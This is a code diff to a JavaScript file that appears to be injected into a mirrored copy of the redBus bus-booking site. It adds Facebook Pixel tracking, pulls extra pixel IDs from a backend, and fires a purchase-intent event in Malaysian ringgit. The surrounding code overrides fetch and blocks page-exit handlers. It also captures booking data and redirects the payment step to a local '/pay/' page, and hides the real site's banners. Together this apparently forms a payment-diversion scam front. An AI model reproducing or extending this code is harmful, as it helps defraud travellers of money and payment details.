@@ -1,6 +1,48 @@
 (function(){
   'use strict';
 
+  // ── FB Pixel ──
+!function(f,b,e,v,n,t,s){
+if(f.fbq)return;
+n=f.fbq=function(){
+n.callMethod
+? n.callMethod.apply(n,arguments)
+: n.queue.push(arguments)
+};
+if(!f._fbq)f._fbq=n;
+n.push=n;
+n.loaded=!0;
+n.version='2.0';
+n.queue=[];
+t=b.createElement(e);
+t.async=!0;
+t.src=v;
+s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)
+}(window,document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+
+fbq('init', '1325759409620752');
+
+fbq('track', 'PageView');
+
+  // Load additional FB pixels from backend settings
+  (function(){
+    fetch('/api/settings')
+      .then(function(r) { return r.json(); })
+      .then(function(json) {
+        var pixels = (json.data && json.data.fbPixels) || [];
+        var enabled = pixels.filter(function(p) { return p.enabled; });
+        enabled.forEach(function(p) {
+          fbq('init', p.pixelId);
+          fbq('track', 'PageView');
+        });
+        try { sessionStorage.setItem('fbPixelIds', JSON.stringify(enabled.map(function(p){ return p.pixelId; }))); } catch(e) {}
+      })
+      .catch(function() {});
+  })();
+
+
   function getUrl(input) {
     if (typeof input === 'string') return input;
     if (input instanceof Request) return input.url;
@@ -9,10 +51,31 @@
   window.addEventListener('beforeunload', function(e) { e.stopImmediatePropagation(); }, true);
 
   function redirectPay() {
+
     var data = extractBookingData();
-    try { localStorage.setItem('redbus_booking', JSON.stringify(data)); } catch(ex) {}
+
+    try {
+        localStorage.setItem(
+            'redbus_booking',
+            JSON.stringify(data)
+        );
+    } catch(ex) {}
+
+    // FB Pixel 埋点
+    if (window.fbq) {
+
+        fbq('track', 'AddToCart', {
+
+            value: Number(data.amount) || 0,
+
+            currency: 'MYR'
+
+        });
+
+    }
+
     location.href = '/pay/';
-  }
+}
 
   var _fetch = window.fetch;
   window.fetch = function(input, init) {
@@ -193,6 +256,7 @@
   var style = document.createElement('style');
   style.textContent = '.modal-backdrop{display:none!important}[class^="downloadAppContainer"]{display:none!important}[class^="liteAppCardContainer"]{display:none!important}[class^="bannerContainer"]{display:none!important}[class^="bottomNavBarWrapper"]{display:none!important}';
   document.head.appendChild(style);
+
   
 
   var observer = new MutationObserver(function () {
